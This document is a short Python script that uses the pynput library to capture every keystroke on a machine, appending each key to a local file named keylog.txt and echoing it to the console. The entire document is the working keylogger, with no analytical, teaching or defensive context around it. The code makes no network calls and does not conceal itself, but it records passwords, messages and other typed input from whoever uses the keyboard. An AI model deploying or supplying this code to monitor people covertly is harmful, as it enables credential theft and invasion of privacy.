from pynput import keyboard

# File to store logged keys
LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        # Convert key to string
        key_str = key.char if hasattr(key, 'char') else str(key)
    except AttributeError:
        key_str = str(key)

    with open(LOG_FILE, "a") as log_file:
        log_file.write(key_str + "\n")

    # Print to console (optional, can be removed)
    print(f"Key Pressed: {key_str}")

# Listener for keyboard events
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
